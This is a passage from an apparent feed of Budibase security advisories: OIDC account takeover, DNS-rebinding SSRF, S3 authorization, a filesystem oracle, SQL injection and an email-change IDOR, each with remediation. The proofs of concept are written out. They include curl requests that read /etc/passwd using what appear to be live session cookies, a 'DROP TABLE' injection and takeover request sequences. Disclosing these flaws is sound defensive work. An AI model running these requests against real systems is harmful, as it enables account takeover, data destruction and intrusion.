                      "email":"victim@stand.local", "email_verified":false }
</code></pre>
<p>The authenticated principal is provably <strong><code>attacker</code></strong> (its own <code>sub</code>/<code>preferred_username</code>/password), merely <em>claiming</em> the victim's email, unverified.</p>
<img width="1484" height="685" alt="image" src="https://github.com/user-attachments/assets/cdddac3c-b7c0-4c59-aaec-9092706a7ad8">


<p><strong>Step 2 — drive the standard OIDC flow</strong> as <code>attacker</code>:
<code>GET /api/global/auth/default/oidc/configs/kc-oidc-1</code> -&gt; IdP login as <code>attacker</code>/<code>Attacker123!</code> -&gt; <code>GET /api/global/auth/oidc/callback?code=…&amp;state=…</code>.</p>
<img width="1145" height="454" alt="image" src="https://github.com/user-attachments/assets/ac0a73d0-c5fc-4d0f-b9b0-95f6273b99f7">

<img width="1172" height="445" alt="image" src="https://github.com/user-attachments/assets/a4b27a7e-4293-4caf-957f-d27c54ea461a">

<img width="1157" height="648" alt="image" src="https://github.com/user-attachments/assets/06699774-92b0-4163-a171-9a30bc877ecc">

<img width="1201" height="525" alt="image" src="https://github.com/user-attachments/assets/92a92fcf-9d29-42ca-921d-de6fbd78198f">



<p><strong>Step 3 — result (takeover):</strong> Budibase sets <code>budibase:auth</code> to a session JWT
<code>{ "userId":"us_1ab2dfcf…", "email":"victim@stand.local", "tenantId":"default" }</code>, and
<code>GET /api/global/self</code> returns the <strong>victim</strong>: <code>_id = us_1ab2dfcf…</code>, <code>admin.global = true</code>, <code>builder.global = true</code>, <code>providerType = oidc</code>. The attacker authenticated as a <em>different</em> IdP principal with an <em>unverified</em> email yet now holds a full global-admin session for the victim.</p>
<img width="1001" height="456" alt="image" src="https://github.com/user-attachments/assets/c8dfc25f-aed7-4cd7-9323-f029e4d1a725">


<p><strong>Negative control (proves the email claim is the cause, not a normal self-login):</strong>
A second attacker <code>attacker2</code> with a <strong>benign</strong> unverified email <code>attacker2@evil.local</code> (matching no Budibase user) runs the <em>identical</em> flow:</p>
<pre><code>id_token: { "sub":"55794bf2-…", "preferred_username":"attacker2", "email":"attacker2@evil.local", "email_verified":false }
-&gt; budibase:auth: { "userId":"us_55794bf2-…" }   (a NEW account, _id derived from the IdP sub)
-&gt; /api/global/self: { "_id":"us_55794bf2-…", "email":"attacker2@evil.local", admin.global: null, builder.global: null }
</code></pre>
<img width="1153" height="489" alt="image" src="https://github.com/user-attachments/assets/8f6cb849-e6f3-49f1-b576-8aeba026a3be">

<img width="1089" height="466" alt="image" src="https://github.com/user-attachments/assets/a892ec3e-3753-4bc0-9eee-9f0613b2d92e">

<img width="826" height="532" alt="image" src="https://github.com/user-attachments/assets/cc30bd9c-1bdb-4bea-934f-a8b3e228940e">


<p>With a benign email the attacker gets <strong>their own new low-privilege account</strong>; only when the email claim equals the victim's does the same flow yield the <strong>victim's admin account</strong>. Same self-authentication, single variable changed = the unverified-email merge is the vulnerability.</p>
<h3 id="impact">Impact</h3>
<p>Takeover of any existing Budibase account by email, including the instance owner / global admin -&gt; full control of the tenant (apps, datasources, automations, user management, stored datasource credentials). The attacker authenticates as their <em>own</em> (different) IdP principal and ends up holding the victim's session and roles. The only requirement beyond a trusted IdP login is that the IdP assert the victim's email unverified — the default for a freshly-created Keycloak/Authentik realm and common in social logins (see Preconditions). Any deployment that trusts an OIDC IdP without enforced email verification is exposed; the Budibase-side flaw (ignoring <code>email_verified</code>) is unconditional.</p>
<h3 id="remediation">Remediation</h3>
<p><strong>Primary fix:</strong> in the OIDC verify path, require <code>email_verified === true</code> before using <code>email</code> to look up / link an existing account; otherwise reject the login (or fall back to <code>sub</code>-only matching and never merge into a pre-existing local/SSO account). Concretely, thread the <code>email_verified</code> claim through <code>buildJwtClaims</code>/<code>getEmail</code> (<code>oidc.ts</code>) and gate the <code>getGlobalUserByEmail</code> fallback in <code>sso.ts:57-59</code> on it.</p>
<p><strong>Audit the whole class:</strong> apply the same <code>email_verified</code> (and, for SAML, <code>EmailVerified</code>/assertion-signature) gate to every SSO strategy that links by email — OIDC, SAML, and any social provider — not only the Google strategy (which already passes <code>requireLocalAccount=true</code>). Email-based account linking anywhere must require a verified email.</p>
<p><strong>Defense-in-depth for operators who cannot patch immediately:</strong></p>
<ul>
<li>On the IdP, enable "Verify Email" / require verified email before issuing tokens (Keycloak: realm -&gt; Login -&gt; Verify Email = on), and restrict which email domains the IdP will assert.</li>
<li>Prefer <code>sub</code>-based account mapping over email in the IdP/Budibase mapping config where available.</li>
<li>Audit existing accounts for unexpected OIDC links to privileged users; rotate sessions.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-hp6v-6jw7-gv2f">https://github.com/Budibase/budibase/security/advisories/GHSA-hp6v-6jw7-gv2f</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/9ecd0048d9c3ae0ee9bd0e6204c621794dd1a4d3">https://github.com/Budibase/budibase/commit/9ecd0048d9c3ae0ee9bd0e6204c621794dd1a4d3</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.30">https://github.com/Budibase/budibase/releases/tag/3.39.30</a></li>
<li><a href="https://github.com/advisories/GHSA-hp6v-6jw7-gv2f">https://github.com/advisories/GHSA-hp6v-6jw7-gv2f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hp6v-6jw7-gv2f</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-24T21:17:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server]  Budibase: DNS rebinding SSRF bypasses remain in OpenAPI import and REST query execution]]></title>
        <id>https://github.com/advisories/GHSA-xg5g-26x8-cvf4</id>
        <link href="https://github.com/advisories/GHSA-xg5g-26x8-cvf4"/>
        <updated>2026-07-24T21:17:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>A builder-level user can make Budibase issue server-side HTTP requests to loopback or private-network targets by using DNS rebinding against two outbound fetch paths that are still not pinned to the validated DNS answer.</p>
<p>The first path is OpenAPI query import. It validates the supplied hostname with the blacklist and then performs a separate raw fetch. A hostname that resolves to a public address during validation and to <code>127.0.0.1</code> during the request is accepted.</p>
<p>The second path is REST datasource/query execution. It calls the fixed <code>fetchWithBlacklist()</code> helper, but provides a custom undici <code>fetchFn</code> that installs a <code>dispatcher</code>. The helper passes a pinned Node <code>agent</code>, but undici uses the dispatcher and resolves the original hostname again at connection time. This defeats the DNS pinning added for the previous outbound fetch advisory.</p>
<p>Impact is authenticated SSRF from the Budibase server process. An attacker with the relevant builder/query privileges can reach loopback or private HTTP services that should be blocked by Budibase's outbound fetch protections, subject to the normal response handling of each feature.</p>
<h2 id="reproduction">Reproduction</h2>
<ol>
<li>Configure an attacker-controlled hostname so the validation lookup returns a public IP address and the later request lookup returns an internal address such as <code>127.0.0.1</code>.</li>
<li>Start a loopback canary HTTP service on the Budibase host.</li>
<li>For OpenAPI query import, submit an import URL such as <code>http://rebind.test:&lt;port&gt;/openapi.json</code> through the builder query import endpoints. In a harness matching the current import code, validation resolved <code>rebind.test</code> to <code>8.8.8.8</code>, the raw fetch then resolved <code>rebind.test</code> to <code>127.0.0.1</code>, and the loopback canary returned <code>loopback-canary-hit:/openapi.json</code>.</li>
<li>For REST datasource/query execution, configure a REST datasource/query URL using the same rebinding hostname. In a harness matching the current helper plus REST undici custom fetch path, a direct loopback URL was blocked and a pinned Node-agent control did not hit loopback, but the REST undici path re-resolved the hostname to <code>127.0.0.1</code> and returned <code>REST-UNDICI-REBIND-CANARY</code> from the loopback service.</li>
</ol>
<p>Observed OpenAPI import proof:</p>
<pre><code class="language-json">{
  "outcome": "allowed",
  "body": "loopback-canary-hit:/openapi.json",
  "lookups": [
    {"phase": "guard", "hostname": "rebind.test", "address": "8.8.8.8"},
    {"phase": "fetch", "hostname": "rebind.test", "address": "127.0.0.1"}
  ]
}
</code></pre>
<p>Observed REST undici proof:</p>
<pre><code class="language-json">{
  "directControl": {"outcome": "blocked", "hitsAfter": 0},
  "pinnedNodeFetchControl": {"outcome": "no_loopback_hit", "hitsAfter": 0},
  "undiciBypass": {
    "outcome": "allowed",
    "status": 200,
    "body": "REST-UNDICI-REBIND-CANARY",
    "hitsAfter": 1
  },
  "lookupTrace": [
    {"phase": "guard", "hostname": "rebind.test", "address": "8.8.8.8"},
    {"phase": "fetch", "hostname": "rebind.test", "address": "127.0.0.1"}
  ]
}
</code></pre>
<h2 id="root-cause-and-technical-details">Root cause and technical details</h2>
<p>The central helper now resolves and validates the target hostname, then passes a pinned Node <code>http.Agent</code> or <code>https.Agent</code> to the request. That protects callers whose HTTP client honors the Node <code>agent</code> option.</p>
<p>OpenAPI query import does not use that helper. In <code>packages/server/src/api/controllers/query/import/index.ts</code>, <code>assertUrlIsSafe()</code> calls <code>blacklist.isBlacklisted(parsed.hostname)</code>, but <code>fetchFromUrl()</code> then calls <code>fetch(currentUrl, { redirect: "manual" })</code>. That creates a validate-then-fetch gap where DNS can change between the blacklist lookup and the actual connection.</p>
<p>REST datasource/query execution uses the helper but changes the transport semantics. In <code>packages/server/src/integrations/rest.ts</code>, <code>setDispatcher()</code> creates an undici dispatcher with <code>getDispatcher({ rejectUnauthorized, url: requestUrl })</code>, then the custom fetch function calls <code>fetch(requestUrl, setDispatcher(requestInput, requestUrl))</code>. In <code>packages/backend-core/src/utils/outboundFetch.ts</code>, <code>fetchWithBlacklist()</code> passes the pinned Node <code>agent</code> to <code>fetchFn</code>, but undici fetch uses the supplied <code>dispatcher</code> instead. The actual connection performs a second hostname resolution and can be rebound to a blocked address.</p>
<p>Current affected code is present in latest <code>master</code> and in the latest release tag <code>3.39.14</code>.</p>
<h2 id="remediation">Remediation</h2>
<p>Route OpenAPI query import through the pinned outbound fetch helper rather than validating and raw-fetching separately.</p>
<p>Make <code>fetchWithBlacklist()</code> pin the actual connection for every supported transport. For undici callers, provide a dispatcher whose lookup or connect behavior is pinned to the validated IP, or reject custom fetch functions that do not explicitly enforce the pinned address. Add regression coverage for direct loopback blocking, DNS rebinding through OpenAPI import, DNS rebinding through REST undici dispatcher, redirect-to-loopback, IPv4-mapped IPv6, and mixed public/private DNS answers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-xg5g-26x8-cvf4">https://github.com/Budibase/budibase/security/advisories/GHSA-xg5g-26x8-cvf4</a></li>
<li><a href="https://github.com/Budibase/budibase/pull/19178">https://github.com/Budibase/budibase/pull/19178</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/1fecb3fc3497e8db7b60b42cc514ce304ffe3a41">https://github.com/Budibase/budibase/commit/1fecb3fc3497e8db7b60b42cc514ce304ffe3a41</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/5758bdb242802ca20c4ed0dc579e4330ee898ef3">https://github.com/Budibase/budibase/commit/5758bdb242802ca20c4ed0dc579e4330ee898ef3</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/586802b5706367520d14245e18a7d0cabab0be11">https://github.com/Budibase/budibase/commit/586802b5706367520d14245e18a7d0cabab0be11</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.30">https://github.com/Budibase/budibase/releases/tag/3.39.30</a></li>
<li><a href="https://github.com/advisories/GHSA-xg5g-26x8-cvf4">https://github.com/advisories/GHSA-xg5g-26x8-cvf4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xg5g-26x8-cvf4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T21:17:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server]  Budibase: S3 presigned URL endpoint authorization regression in v3.39.4 allows BASIC users to obtain S3 PutObject presigned URLs]]></title>
        <id>https://github.com/advisories/GHSA-xcx6-4f2g-hhgx</id>
        <link href="https://github.com/advisories/GHSA-xcx6-4f2g-hhgx"/>
        <updated>2026-07-24T21:17:04.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>In Budibase v3.39.4, a regression in the authorization level for the S3 attachment upload endpoint allows any BASIC app user to obtain S3 PutObject presigned URLs. The endpoint uses TABLE/WRITE permission level instead of the intended BUILDER level defined in v3.39.3. Additionally, the controller does not pin the target bucket to the datasource's configured bucket, allowing writes to any S3 bucket the stored IAM credentials can access.</p>
<h2 id="reproduction">Reproduction</h2>
<ol>
<li>As a BASIC app user, discover or obtain a valid S3 datasource ID within the app</li>
<li>Send a POST request:</li>
</ol>
<pre><code>POST /api/attachments/&lt;datasourceId&gt;/url
Content-Type: application/json
x-budibase-app-id: &lt;appId&gt;

{"bucket": "target-bucket", "key": "malicious-file.html"}
</code></pre>
<ol start="3">
<li>The response contains a valid S3 PutObject presigned URL</li>
<li>Use the presigned URL to upload arbitrary content to any writable S3 bucket in the IAM credential scope</li>
</ol>
<h2 id="root-cause">Root Cause</h2>
<p>The <code>/api/attachments/:datasourceId/url</code> route was changed from <code>authorized(BUILDER)</code> in v3.39.3 to <code>authorized(PermissionType.TABLE, PermissionLevel.WRITE)</code> in v3.39.4. BASIC users have TABLE/WRITE permissions by default, so they can call this endpoint. The controller at <code>packages/server/src/api/controllers/static/index.ts:614-632</code> accepts the <code>bucket</code> parameter directly from the request body and passes it to <code>getSignedUrl</code> without validating against the datasource's configured bucket.</p>
<h2 id="evidence">Evidence</h2>
<p>The test suite at <code>packages/server/src/api/routes/tests/static.spec.ts:218-235</code> confirms this behavior. The test authenticates as a BASIC role user and successfully generates a signed upload URL, verifying HTTP 200 and a defined <code>res.body.signedUrl</code>.</p>
<h2 id="remediation">Remediation</h2>
<ol>
<li>Restore the <code>authorized(BUILDER)</code> middleware on the route</li>
<li>Add <code>paramResource("datasourceId")</code> to ensure the datasource belongs to the caller's app</li>
<li>Pin the S3 bucket to <code>datasource.config.bucket</code> in the controller, ignoring the caller-supplied bucket value</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-xcx6-4f2g-hhgx">https://github.com/Budibase/budibase/security/advisories/GHSA-xcx6-4f2g-hhgx</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.40.0">https://github.com/Budibase/budibase/releases/tag/3.40.0</a></li>
<li><a href="https://github.com/advisories/GHSA-xcx6-4f2g-hhgx">https://github.com/advisories/GHSA-xcx6-4f2g-hhgx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcx6-4f2g-hhgx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T21:17:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server]  Budibase: Server Filesystem Existence/Read Oracle via Builder-Controlled MongoDB tlsCertificateKeyFile]]></title>
        <id>https://github.com/advisories/GHSA-ppr4-5f46-j9c6</id>
        <link href="https://github.com/advisories/GHSA-ppr4-5f46-j9c6"/>
        <updated>2026-07-24T21:16:41.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When creating a MongoDB datasource, Budibase passes the <code>tlsCertificateKeyFile</code> and <code>tlsCAFile</code> fields straight to the MongoDB driver as server-side file paths. On Budibase Cloud a customer cannot place files on the server, so these fields only let a builder reference arbitrary absolute paths on the underlying multi-tenant server. When the datasource is verified, the driver performs a real filesystem read of that path, and the error differs by file state, turning <code>/api/datasources/verify</code> into an arbitrary-path existence/read oracle over the whole server filesystem.</p>
<h2 id="root-cause">Root Cause</h2>
<p><code>packages/server/src/integrations/mongodb.ts</code> passes <code>config.tlsCertificateKeyFile</code> / <code>config.tlsCAFile</code> directly to <code>new MongoClient(config.connectionString, options)</code> as filesystem paths, with no allow-list, no confinement to a certificates directory, and no rejection of absolute / <code>..</code> paths.</p>
<p>POC </p>
<h2 id="reproduction--paste-each-line-press-enter">Reproduction — paste each line, press Enter</h2>
<p>Line 1 (existing file — proves the file is READ):</p>
<pre><code>curl -s -X POST "https://hasinocompany.budibase.app/api/datasources/verify" -H "Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0" -H "x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec" -H "x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" -d '{"datasource":{"name":"probe","source":"MONGODB","type":"datasource","config":{"connectionString":"mongodb://127.0.0.1:27017/?tls=true","database":"x","tlsCertificateKeyFile":"/etc/passwd"}}}'
</code></pre>
<p>RESPONSE</p>
<p>{"connected":false,"error":"error:0480006C:PEM routines::no start line"} </p>
<p>Line 2 (missing file — path is reflected):</p>
<pre><code>curl -s -X POST "https://hasinocompany.budibase.app/api/datasources/verify" -H "Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0" -H "x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec" -H "x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" -d '{"datasource":{"name":"probe","source":"MONGODB","type":"datasource","config":{"connectionString":"mongodb://127.0.0.1:27017/?tls=true","database":"x","tlsCertificateKeyFile":"/nonexistent/pentest/xyz"}}}'
</code></pre>
<p>RESPONSE</p>
<p>{"connected":false,"error":"ENOENT: no such file or directory, open '/nonexistent/pentest/xyz'"}</p>
<h3 id="actual-output">Actual output</h3>
<pre><code class="language-text">/etc/passwd               -&gt; {"connected":false,"error":"error:0480006C:PEM routines::no start line"}          (EXISTS, was READ)
/nonexistent/pentest/xyz  -&gt; {"connected":false,"error":"ENOENT: no such file or directory, open '/nonexistent/pentest/xyz'"}   (MISSING, path reflected)
</code></pre>
<p>Existing files return a "PEM routines" error (the file was read but is not PEM); missing files return <code>ENOENT ... open '&lt;path&gt;'</code> with the path echoed back. This confirms a real filesystem read at the attacker-chosen absolute path. Confirmed 3/3 separate runs.</p>
<h2 id="impact">Impact</h2>
<table>
<thead>
<tr>
<th>Who / what is affected</th>
<th>How</th>
</tr>
</thead>
<tbody><tr>
<td>The underlying multi-tenant Cloud server</td>
<td>Arbitrary-path existence/read oracle from a builder account</td>
</tr>
<tr>
<td>Server config / secret files, other tenants' paths</td>
<td>Located by enumerating paths (exists vs missing)</td>
</tr>
<tr>
<td>PEM/certificate files on the server</td>
<td>Content exfiltratable via mutual-TLS to an attacker MongoDB server (mechanism)</td>
</tr>
</tbody></table>
<h2 id="recommended-fix">Recommended Fix</h2>
<ol>
<li>On managed/Cloud, disallow <code>tlsCertificateKeyFile</code> / <code>tlsCAFile</code> as filesystem paths; accept PEM content and write it to a per-connection temp file under a fixed directory.</li>
<li>Reject absolute and <code>..</code> paths; confine any file reference to an allow-listed certificates directory.</li>
<li>Route the MongoDB connection host through the SSRF blacklist, as the REST integration already does.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-ppr4-5f46-j9c6">https://github.com/Budibase/budibase/security/advisories/GHSA-ppr4-5f46-j9c6</a></li>
<li><a href="https://github.com/Budibase/budibase/pull/19244">https://github.com/Budibase/budibase/pull/19244</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/5e19b935536d6d1be1f47100e43c6fb30917826e">https://github.com/Budibase/budibase/commit/5e19b935536d6d1be1f47100e43c6fb30917826e</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.40.0">https://github.com/Budibase/budibase/releases/tag/3.40.0</a></li>
<li><a href="https://github.com/advisories/GHSA-ppr4-5f46-j9c6">https://github.com/advisories/GHSA-ppr4-5f46-j9c6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ppr4-5f46-j9c6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T21:16:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server]  Budibase: SQL Injection via `multipleStatements: true`]]></title>
        <id>https://github.com/advisories/GHSA-q6x4-v3qx-85qw</id>
        <link href="https://github.com/advisories/GHSA-q6x4-v3qx-85qw"/>
        <updated>2026-07-24T21:15:02.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A critical SQL injection vulnerability was discovered in Budibase's MySQL integration that allows remote attackers to execute arbitrary SQL commands.</p>
<h2 id="details">Details</h2>
<h3 id="vulnerability-type">Vulnerability Type</h3>
<p>SQL Injection</p>
<h3 id="description">Description</h3>
<p>The MySQL integration component in Budibase is configured with <code>multipleStatements: true</code>, enabling execution of multiple SQL statements in a single query. Attackers can inject malicious SQL commands through user input fields, leading to complete database compromise.</p>
<h3>Location</h3>
<pre><code class="language-typescript">// File: packages/server/src/integrations/mysql.ts
// Line: 173

this.config = {
  ...config,
  typeCast: defaultTypeCasting,
  multipleStatements: true,  // VULNERABLE
  timezone: "Z",
}
</code></pre>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="exploit">Exploit</h3>
<pre><code class="language-javascript">const mysql = require('mysql2');

// Budibase vulnerable configuration
const connection = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'password',
  multipleStatements: true,  // Vulnerable setting
  timezone: "Z"
});

// Attack: Data destruction
connection.query(
  `SELECT * FROM users WHERE id = 1; DROP TABLE sensitive_data; --`,
  (err, results) =&gt; {
    if (!err) console.log("Table dropped successfully");
  }
);
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Data Destruction</strong>: Execute DROP TABLE, DELETE commands</li>
<li><strong>Data Theft</strong>: Exfiltrate data via SELECT INTO OUTFILE</li>
<li><strong>Privilege Escalation</strong>: Grant database admin privileges</li>
<li><strong>Denial of Service</strong>: Disrupt service operations</li>
<li><strong>Complete Database Compromise</strong>: Full control over database</li>
</ul>
<h2 id="remediation">Remediation</h2>
<h3 id="patch">Patch</h3>
<pre><code class="language-diff">--- a/packages/server/src/integrations/mysql.ts
+++ b/packages/server/src/integrations/mysql.ts
@@ -170,7 +170,7 @@ class MySQLIntegration extends Sql implements DatasourcePlus {
     this.config = {
       ...config,
       typeCast: defaultTypeCasting,
-      multipleStatements: true,
+      multipleStatements: false,
       timezone: "Z",
     }
   }
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<ol>
<li>Temporarily disable MySQL integration</li>
<li>Implement web application firewall (WAF)</li>
<li>Restrict database user privileges</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-q6x4-v3qx-85qw">https://github.com/Budibase/budibase/security/advisories/GHSA-q6x4-v3qx-85qw</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.40.0">https://github.com/Budibase/budibase/releases/tag/3.40.0</a></li>
<li><a href="https://github.com/advisories/GHSA-q6x4-v3qx-85qw">https://github.com/advisories/GHSA-q6x4-v3qx-85qw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q6x4-v3qx-85qw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-24T21:15:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server]  Budibase: Email Change IDOR via POST /api/v2/email allows full Account Takeover (accountId not validated against session)]]></title>
        <id>https://github.com/advisories/GHSA-c8vc-7pv3-g98p</id>
        <link href="https://github.com/advisories/GHSA-c8vc-7pv3-g98p"/>
        <updated>2026-07-24T21:14:51.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>POST /api/v2/email</code> on the account portal (<code>account.budibase.app</code>) starts an email-change workflow using a client-supplied <code>accountId</code> that is <strong>not validated against the authenticated session</strong>. A logged-in attacker supplies a victim's <code>accountId</code> and an email address they control; the verification code is delivered to the attacker's address, and completing the workflow changes the <strong>victim's</strong> account email. The attacker then password-resets the victim's account through the controlled address and logs in — full account takeover with no victim interaction.</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>The endpoint session-checks the <code>currentEmail</code> field (a mismatch returns 403), but it does not enforce <code>body.accountId === session.accountId</code>. The account-portal frontend only ever submits the logged-in user's own accountId, so in normal use the two always match — the server simply trusts the body value. An attacker who has a victim's <code>accountId</code> can point the workflow at the victim's account while passing their own <code>currentEmail</code> to clear the session check.</p>
<p>This is more powerful than a direct password reset: <code>PUT /api/v2/auth/password {email}</code> already exists and is gated only on knowing the victim's email, but the reset link is sent to the address on the account — the victim's inbox, which the attacker does not control. This IDOR moves the victim's email to an attacker-controlled inbox first, so the attacker receives the reset link and sets a password they know.</p>
<p><strong>accountId obtainability.</strong> We checked every endpoint reachable from a non-admin free-tier account — <code>GET /api/global/users</code> (no UUID in any user record), <code>GET /api/global/auditlogs/search</code> (no accountId field), <code>GET /api/global/users/invites</code> (code + email + name only), <code>GET /api/v2/tenant</code> (one tenant-internal UUID, not a user accountId), the account-portal frontend (passes the session's own accountId only), and all unauthenticated endpoints — and the victim's <code>accountId</code> was not present in any of them. The attacker must obtain the UUID through some channel other than the normal API surface (support channel, screenshot, a leak, prior compromise, etc.).</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<p><strong>Setup:</strong> Two account-portal accounts at <code>https://account.budibase.app</code> — Account A (attacker) and Account B (victim). From Account B's session, <code>GET /api/auth/self</code> returns <code>account.accountId</code> — this is the value the attacker needs.</p>
<ol>
<li><strong>Start the email-change workflow pointed at the victim's accountId, newEmail = attacker-controlled.</strong></li>
</ol>
<pre><code class="language-http">POST /api/v2/email HTTP/1.1
Host: account.budibase.app
Content-Type: application/json
Cookie: budibase:auth=&lt;ACCOUNT_A_JWT&gt;

{"currentEmail":"&lt;ACCOUNT_A_EMAIL&gt;","newEmail":"attacker-controlled@example.net","accountId":"&lt;VICTIM_ACCOUNT_ID&gt;"}
</code></pre>
<p>Response: <code>201 Created</code>, sets <code>budibase:change_email:correlationkey</code> (HttpOnly), <code>:instancekey</code>, <code>:status</code>, <code>:newemail</code> cookies. The workflow started against the victim's accountId even though the caller is Account A.</p>
<ol start="2">
<li><strong>Complete the change with the code from the attacker-controlled inbox (or read directly from the <code>correlationkey</code> cookie set in step 1).</strong></li>
</ol>
<pre><code class="language-http">POST /api/v2/email/verification HTTP/1.1
Host: account.budibase.app
Content-Type: application/json
Cookie: budibase:auth=&lt;ACCOUNT_A_JWT&gt;; budibase:change_email:correlationkey=&lt;CODE&gt;; budibase:change_email:instancekey=&lt;KEY&gt;

{"verificationCode":"&lt;code&gt;","processInstanceKey":"&lt;key&gt;"}
</code></pre>
<p>Response: <code>200 OK</code>. The victim's account email is now <code>attacker-controlled@example.net</code>.</p>
<ol start="3">
<li><strong>Confirm the change hit the victim, not the caller (false-positive control).</strong></li>
</ol>
<ul>
<li>Account A (caller) still logs in with its own original email — 200, unchanged.</li>
<li>Account B's (victim) original email is now rejected — 403, locked out.</li>
<li><code>attacker-controlled@example.net</code> now logs into the victim's account — 200.</li>
</ul>
<ol start="4">
<li><strong>Take over the account.</strong></li>
</ol>
<pre><code class="language-http">PUT /api/v2/auth/password HTTP/1.1
Host: account.budibase.app
Content-Type: application/json

{"email":"attacker-controlled@example.net"}
</code></pre>
<p>Response: <code>202 Accepted</code>, reset link delivered to the attacker's own inbox. Complete the reset with <code>PUT /api/v2/auth/password/verification</code>, then log in as the victim with the attacker-chosen password. <code>GET /api/auth/self</code> afterward returns the victim's real <code>accountId</code> and <code>tenantId</code> — full account takeover, confirmed via a genuinely separate account/tenant (not a same-account self-test).</p>
<h2 id="impact">Impact</h2>
<p>An authenticated account-portal user who obtains a victim's <code>accountId</code> (out-of-band — it is not exposed anywhere in the normal cross-user API surface we could find) can take over that victim's account: rewrite the login email to an attacker address, set a new password, and access the victim's tenants, apps, and stored datasource credentials (REST/SQL/S3 auth). The victim is locked out of their own account. Every step from the initial IDOR write to full login-as-victim is deterministic and 100% reliable once the accountId is known — no additional vulnerability or guessing is required, since the chain uses nothing but the platform's own stock password-reset flow.</p>
<h2 id="remediation">Remediation</h2>
<p>Validate that the body's <code>accountId</code> equals the authenticated session's <code>accountId</code> before starting or completing the email-change workflow (the same check already applied to <code>currentEmail</code>). Do not trust a client-supplied <code>accountId</code> to select the workflow target.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-c8vc-7pv3-g98p">https://github.com/Budibase/budibase/security/advisories/GHSA-c8vc-7pv3-g98p</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.40.0">https://github.com/Budibase/budibase/releases/tag/3.40.0</a></li>
<li><a href="https://github.com/advisories/GHSA-c8vc-7pv3-g98p">https://github.com/advisories/GHSA-c8vc-7pv3-g98p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c8vc-7pv3-g98p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T21:14:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server]  Budibase: SSO OAuth2 Token Leakage via User Metadata Endpoints to Power-Role Users]]></title>
        <id>https://github.com/advisories/GHSA-fcrw-f7gg-6g9f</id>
